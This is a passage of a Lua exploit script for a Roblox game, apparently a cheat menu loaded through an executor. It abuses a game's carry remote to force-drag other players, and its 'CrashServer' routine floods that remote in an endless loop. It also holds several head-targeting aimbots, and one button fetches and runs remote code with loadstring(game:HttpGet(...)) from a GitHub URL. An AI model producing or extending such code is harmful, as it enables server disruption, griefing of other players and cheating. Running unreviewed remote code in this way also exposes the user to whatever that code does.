toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White when OFF
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Couple Hug")

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.03)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.03)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait()
	end
end

commands["Secret"] = function()
	local chatService = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	chatService:FireServer("MONSY BALABAGKUMANTOT", "All")
end

-- Toggle logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- Green ON
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White OFF
	end
end)
end)

addMainMenuButton("BRING SYSTEM 2 [3KTG]", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "BringPartGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = "Frame"
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "TAONG GOMA CMD"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Changed from red to white
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = "CommandBox"
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- Changed from red to white
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Pabuhat")

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.07)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.07)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait()
	end
end

commands["Secret"] = function()
	local chatService = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	chatService:FireServer("MONSY BALABAGKUMANTOT", "All")
end

-- Toggle logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- Changed OFF color to white
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BRING ALL CARRY SYSTEM [NEW]", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "BringPartGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = "Frame"
frame.Size = UDim2.new(0, 300, 0, 270)
frame.Position = UDim2.new(0.5, -150, 0.5, -135)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "BRING ALL SYSTEM"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

-- Helper to create black button with white text
local function createButton(name, text, yPos)
	local button = Instance.new("TextButton")
	button.Name = name
	button.Text = text
	button.Font = Enum.Font.GothamBold
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.TextSize = 14
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.BorderSizePixel = 0
	button.Size = UDim2.new(0.9, 0, 0, 35)
	button.Position = UDim2.new(0.05, 0, 0, yPos)
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
	button.Parent = frame
	return button
end

-- Create Buttons
local bringAllButton = createButton("BringAllButton", "BringAll", 35)
local bringRandomButton = createButton("BringRandomButton", "BringRandom", 80)
local crashServerButton = createButton("CrashServerButton", "CrashServer", 125)

-- Username TextBox
local textBox = Instance.new("TextBox")
textBox.Name = "CommandBox"
textBox.Text = ""
textBox.PlaceholderText = "Enter Username"
textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextSize = 14
textBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 35)
textBox.Position = UDim2.new(0.05, 0, 0, 170)
textBox.ClearTextOnFocus = false
textBox.Parent = frame
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 6)

-- Execute Button
local executeButton = createButton("ExecuteButton", "EXECUTE", 215)

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices")["Couple Hug"]

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.02)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.02)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait(5)
	end
end

-- Button connections
bringAllButton.MouseButton1Click:Connect(commands["BringAll"])
bringRandomButton.MouseButton1Click:Connect(commands["BringRandom"])
crashServerButton.MouseButton1Click:Connect(commands["CrashServer"])

-- Execute button logic (EXACT NAME, uses "Dragging Carry ")
executeButton.MouseButton1Click:Connect(function()
	local inputText = textBox.Text:match("^%s*(.-)%s*$") -- trim
	if inputText == "" then
		warn("Please enter a username.")
		return
	end

	local target = Players:FindFirstChild(inputText)
	if target and target ~= player then
		carryRemote:FireServer({
			cmd = "Carry",
			firstPlr = target,
			carrychoicesss = ReplicatedStorage.CarryReplic.CarryChoices["Couple Hug"]
		})
	else
		warn("Player '" .. inputText .. "' not found in server.")
	end
end)
end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["AIMBOT MENU"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("ALADIA AIMBOT [3KTG]", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = workspace.CurrentCamera
 
local AimEnabled = false  -- Toggle aim on/off
local Smoothness = 1   -- Lower value for ultra-smooth tracking (closer to 0 is slower, more precise)
local AimbotMode = "Instant" -- Options: "Instant", "Smooth"
local FOV = 7  -- Field of View in degrees (adjust to your preference)
 
-- Function to get head, neck, or humanoid root part for aiming
local function getTargetPart(character)
    local head = character:FindFirstChild("Head")
    local neck = character:FindFirstChild("Neck")
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
 
    local upperTorso = character:FindFirstChild("UpperTorso")
    local neckAttachment = upperTorso and upperTorso:FindFirstChild("NeckAttachment")
 
    if head then
        return head.Position
    elseif neck then
        return neck.CFrame.Position
    elseif neckAttachment then
        return neckAttachment.WorldPosition
    elseif humanoidRootPart then
        return humanoidRootPart.Position
    end
    return nil
end
 
-- Function to find the closest player's head or neck with distance and FOV check
local function getClosestPlayer()
    local closestTarget = nil
    local shortestDistance = math.huge
 
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local character = player.Character
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                humanoid.Died:Connect(function()
                    player.Character = player.CharacterAdded:Wait()
                end)
                local targetPos = getTargetPart(character)
                if targetPos then
                    -- Calculate distance to the target
                    local distance = (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude
 
                    -- Calculate FOV
                    local screenPoint, onScreen = Camera:WorldToScreenPoint(targetPos)
                    if onScreen then
                        local toTarget = (targetPos - Camera.CFrame.Position).unit
                        local cameraForward = Camera.CFrame.LookVector
                        local angle = math.acos(cameraForward:Dot(toTarget)) * (180 / math.pi)
 
                        -- Check if within FOV and the closest distance
                        if angle <= FOV and distance < shortestDistance then
                            shortestDistance = distance
                            closestTarget = targetPos
                        end
                    end
                end
            end
        end
    end
    return closestTarget
end
 
-- Aimbot Function
local function aimAtTarget()
    local target = getClosestPlayer()
    if target then
        if AimbotMode == "Instant" then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target)
        elseif AimbotMode == "Smooth" then
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, target), Smoothness)
        end
    end
end
 
-- Toggle Aimbot on right click hold
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then  -- Right Click to activate
        AimEnabled = true
    end
end)
 
UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then  -- Release Right Click to deactivate
        AimEnabled = false
    end
end)
 
-- Run Aimbot every frame
RunService.RenderStepped:Connect(function()
    if AimEnabled then
        aimAtTarget()
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("FANTASMA AIMBOT [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/usbkillerx/EZhacker/refs/heads/main/EZhack"))()
end)

addMainMenuButton("AIMBOT ON / OFF  [3KTG]", function()
	--// CONFIG
getgenv().Environment = {
    FOVSettings = {
        Amount = 150,
        Visible = true,
        Color = Color3.fromRGB(255, 255, 255) -- White FOV
    },
    Aimbot = {
        Enabled = true,
        AimPart = "Head"
    }
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

--// CREATE FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Transparency = 1
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

--// UPDATE FOV CIRCLE POSITION
RunService.RenderStepped:Connect(function()
    Circle.Position = UIS:GetMouseLocation()
    Circle.Visible = Environment.FOVSettings.Visible
    Circle.Radius = Environment.FOVSettings.Amount
end)

--// AIMBOT FUNCTION
local function GetClosestPlayer()
    local closest, dist = nil, Environment.FOVSettings.Amount
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(Environment.Aimbot.AimPart) then
            local headPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character[Environment.Aimbot.AimPart].Position)
            if onScreen then
                local mag = (Vector2.new(headPos.X, headPos.Y) - UIS:GetMouseLocation()).Magnitude
                if mag < dist then
                    closest = player
                    dist = mag
                end
            end
        end
    end
    return closest
end

RunService.RenderStepped:Connect(function()
    if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            workspace.CurrentCamera.CFrame = CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                target.Character[Environment.Aimbot.AimPart].Position
            )
        end
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local FOVLabel = Instance.new("TextLabel")
local FOVToggleButton = Instance.new("TextButton")  -- FOV visibility toggle button
local AimbotToggleButton = Instance.new("TextButton")  -- Aimbot ON/OFF toggle button

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 180)  -- Adjusted size to accommodate two buttons
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PERSONAL AIMBOT CHESTER" -- Custom Title
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = Frame

-- FOV text display
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.45, 0)
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
FOVLabel.TextSize = 14
FOVLabel.Font = Enum.Font.SourceSans
FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.Parent = Frame

-- FOV Visibility Toggle button (top)
FOVToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
FOVToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
FOVToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
FOVToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FOVToggleButton.TextSize = 14
FOVToggleButton.Font = Enum.Font.SourceSansBold
FOVToggleButton.Text = "FOV: Visible"
FOVToggleButton.Parent = Frame

-- Aimbot ON/OFF Toggle button (bottom)
AimbotToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
AimbotToggleButton.Position = UDim2.new(0.1, 0, 0.85, 0)
AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
AimbotToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
AimbotToggleButton.TextSize = 14
AimbotToggleButton.Font = Enum.Font.SourceSansBold
AimbotToggleButton.Text = "Aimbot: On"
AimbotToggleButton.Parent = Frame

-- FOV slider logic
local dragging = false

local function updateFOV(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newFOV = math.floor(50 + percent * 400)
    Environment.FOVSettings.Amount = newFOV
    FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local percent = (UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateFOV(percent)
    end
end)

-- Toggle FOV visibility
FOVToggleButton.MouseButton1Click:Connect(function()
    Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
    if Environment.FOVSettings.Visible then
        FOVToggleButton.Text = "FOV: Visible"
        FOVToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    else
        FOVToggleButton.Text = "FOV: Hidden"
        FOVToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    end
end)

-- Toggle Aimbot functionality (ON/OFF)
AimbotToggleButton.MouseButton1Click:Connect(function()
    if Environment.Aimbot.Enabled then
        -- Turn Aimbot off
        Environment.Aimbot.Enabled = false
        AimbotToggleButton.Text = "Aimbot: Off"  -- Change text to Off
        AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)  -- Red background
    else
        -- Turn Aimbot on
        Environment.Aimbot.Enabled = true
        AimbotToggleButton.Text = "Aimbot: On"  -- Change text to On
        AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)  -- Green background
    end
end)

-- Initial setup for the slider
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AIMBOT CELLPHONE [3KTG]", function()
	--[[ 
    DEV TEST AIMBOT (Head Target)
    + White FOV circle
    + Mobile: works only when scoped (zoom in)
]]

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local cam = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")

-- SETTINGS
local ENABLED = false
local FOV = 50         -- Aim cone in degrees
local SMOOTH = 12      -- Higher = faster aim
local MAX_DIST = 250   -- Max distance
local SCOPE_FOV = 50   -- Camera FOV threshold to consider as scoped

-- Draw FOV Circle
local fovCircle = Drawing.new("Circle")
fovCircle.Color = Color3.fromRGB(255, 255, 255) -- White
fovCircle.Thickness = 1
fovCircle.NumSides = 64
fovCircle.Radius = FOV * 2
fovCircle.Filled = false
fovCircle.Visible = true

-- Create on-screen toggle button (mobile)
local function makeToggleButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DevAutoAimToggle"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local btn = Instance.new("TextButton")
    btn.Name = "AutoAimBtn"
    btn.Size = UDim2.new(0, 140, 0, 40)
    btn.Position = UDim2.new(1, -150, 1, -90)
    btn.BackgroundTransparency = 0.4
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 16
    btn.Text = "AutoAim: OFF"
    btn.Parent = screenGui

    btn.MouseButton1Click:Connect(function()
        ENABLED = not ENABLED
        btn.Text = "AutoAim: " .. (ENABLED and "ON" or "OFF")
    end)
end

makeToggleButton()

-- PC toggle key
UserInputService.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if inp.KeyCode == Enum.KeyCode.O then
        ENABLED = not ENABLED
        local gui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("DevAutoAimToggle")
        if gui and gui:FindFirstChild("AutoAimBtn") then
            gui.AutoAimBtn.Text = "AutoAim: " .. (ENABLED and "ON" or "OFF")
        end
    end
end)

-- Function to get nearest target's head
local function getNearestTarget()
    local best, bestAngle = nil, math.huge
    local origin = cam.CFrame.Position
    local forward = cam.CFrame.LookVector

    for _, pl in pairs(Players:GetPlayers()) do
        if pl ~= player and pl.Character and pl.Character:FindFirstChild("Head") then
            local head = pl.Character.Head
            local dir = head.Position - origin
            local dist = dir.Magnitude
            if dist <= MAX_DIST then
                local angle = math.deg(math.acos(math.clamp(forward:Dot(dir.Unit), -1, 1)))
                if angle <= FOV/2 and angle < bestAngle then
                    -- Optional LOS check
                    local ray = Ray.new(origin, dir.Unit * dist)
                    local hit = workspace:FindPartOnRayWithIgnoreList(ray, {player.Character}, false, true)
                    if not hit or hit:IsDescendantOf(pl.Character) then
                        best = head
                        bestAngle = angle
                    end
                end
            end
        end
    end
    return best
end

-- Auto-aim loop
RunService.RenderStepped:Connect(function(dt)
    -- Update FOV circle position
    local viewportSize = cam.ViewportSize
    fovCircle.Position = Vector2.new(viewportSize.X/2, viewportSize.Y/2)
    fovCircle.Radius = FOV * 2

    -- Mobile scope check
    local isScoped = (UserInputService.TouchEnabled and cam.FieldOfView <= SCOPE_FOV)
    
    -- Only aim if enabled + (PC or mobile scoped)
    if not ENABLED or (UserInputService.TouchEnabled and not isScoped) then
        return
    end

    local target = getNearestTarget()
    if target and target.Parent then
        local curPos = cam.CFrame.Position
        local curLook = cam.CFrame.LookVector
        local wantLook = (target.Position - curPos).Unit
        local t = 1 - math.exp(-SMOOTH * dt)
        local newLook = (curLook:Lerp(wantLook, t)).Unit
        cam.CFrame = CFrame.new(curPos, curPos + newLook)
    end
end)
end)

addMainMenuButton("AIMBOT ADJUSTABLE [3KTG]", function()
	--// CONFIG
getgenv().Environment = {
    FOVSettings = {
        Amount = 150,
        Visible = true,
        Color = Color3.fromRGB(255, 255, 255) -- White FOV
    },
    Aimbot = {
        Enabled = true,
        AimPart = "Head"
    }
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

--// CREATE FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Transparency = 1
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

--// UPDATE FOV CIRCLE POSITION
RunService.RenderStepped:Connect(function()
    Circle.Position = UIS:GetMouseLocation()
    Circle.Visible = Environment.FOVSettings.Visible
    Circle.Radius = Environment.FOVSettings.Amount
end)

--// AIMBOT FUNCTION
local function GetClosestPlayer()
    local closest, dist = nil, Environment.FOVSettings.Amount
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(Environment.Aimbot.AimPart) then
            local headPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character[Environment.Aimbot.AimPart].Position)
            if onScreen then
                local mag = (Vector2.new(headPos.X, headPos.Y) - UIS:GetMouseLocation()).Magnitude
                if mag < dist then
                    closest = player
                    dist = mag
                end
            end
        end
    end
    return closest
end

RunService.RenderStepped:Connect(function()
    if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            workspace.CurrentCamera.CFrame = CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                target.Character[Environment.Aimbot.AimPart].Position
            )
        end
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local FOVLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 140)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "TAONG GOMA AIMBOT" -- Custom Title
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = Frame

-- FOV text display
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.45, 0)
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
FOVLabel.TextSize = 14
FOVLabel.Font = Enum.Font.SourceSans
